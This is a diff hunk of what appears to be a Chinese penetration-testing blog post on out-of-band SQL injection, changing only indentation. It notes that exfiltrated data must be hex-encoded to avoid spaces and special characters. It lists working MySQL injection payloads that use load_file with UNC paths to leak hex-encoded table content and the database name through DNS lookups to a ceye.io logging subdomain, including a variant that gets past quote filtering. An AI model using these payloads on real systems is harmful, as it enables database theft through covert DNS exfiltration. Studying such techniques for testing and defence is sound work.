@@ -29,10 +29,10 @@ img: https://i.loli.net/2018/07/09/5b434692472ed.png
      经过摸索，初步得出结论，外传的数据中如果含有空格或特殊字符则无法外传。可以考虑hex。
      测试语句：
 '''
-    1.union select 1,load_file(concat("\\\\",(select hex(content) from pentest.news limit 1,1),'.g8vbmp.ceye.io\\abc')),3
-    2.id =(case when (1=1) then (select load_file(concat('\\\\',(select database()),'.g8vbmp.ceye.io\\qw'))) else 1*(select 1 from dual union select 2 from dual) end);'
+1.union select 1,load_file(concat("\\\\",(select hex(content) from pentest.news limit 1,1),'.g8vbmp.ceye.io\\abc')),3
+2.id =(case when (1=1) then (select load_file(concat('\\\\',(select database()),'.g8vbmp.ceye.io\\qw'))) else 1*(select 1 from dual union select 2 from dual) end);'
 
- 可以绕过单双引号过滤的语句：
+可以绕过单双引号过滤的语句：
 id =11 union select 1,load_file(concat(0x5c5c,(select hex(content) from pentest.news limit 1,1),0x2e6675636b6766772e636579652e696f5c5c61626378)),3;
 
 '''
